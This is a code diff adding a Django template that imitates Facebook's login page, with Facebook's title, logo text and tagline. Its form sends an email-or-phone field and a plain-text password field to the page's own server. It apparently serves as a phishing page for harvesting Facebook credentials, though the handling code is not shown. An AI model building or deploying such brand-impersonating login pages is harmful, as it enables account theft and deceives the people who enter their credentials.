@@ -1,0 +1,62 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook — log in or sign up</title>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="{% static 'css/index.css' %}"
+    />
+  </head>
+
+  <body>
+    <div class="container">
+      <section class="intro-section">
+        <h1>facebook</h1>
+
+        <p>
+          Facebook helps you connect and share with the people in your life.
+        </p>
+      </section>
+
+      <section class="signin-section">
+        <div>
+          <form action="" method="post">
+            {% csrf_token %}
+            <div>
+              <input
+                type="text"
+                placeholder="Email address or phone number"
+                name="number"
+              />
+            </div>
+
+            <div>
+              <input type="text" placeholder="Password" name="password" />
+            </div>
+
+            <div>
+              <button>Log in</button>
+            </div>
+
+            <a href="#">Forgotten password?</a>
+
+            <hr />
+
+            <div class="create-btn">
+              <button>Create new account</button>
+            </div>
+          </form>
+        </div>
+
+        <p>
+          <a href="#"><strong> Create a Page </strong></a> for a celebrity,
+          brand or business.
+        </p>
+      </section>
+    </div>
+  </body>
+</html>
